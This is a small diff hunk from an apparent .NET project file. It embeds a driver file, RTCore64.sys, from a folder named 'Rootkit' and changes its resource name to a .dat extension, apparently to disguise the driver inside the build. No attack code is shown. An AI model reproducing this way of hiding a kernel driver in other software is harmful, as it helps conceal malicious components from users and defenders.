@@ -50,7 +50,7 @@
       <LogicalName>config.json</LogicalName>
     </EmbeddedResource>
     <EmbeddedResource Include="..\Rootkit\RTCore64.sys">
-      <LogicalName>RTCore64.sys</LogicalName>
+      <LogicalName>RTCore64.dat</LogicalName>
     </EmbeddedResource>
   </ItemGroup>
 
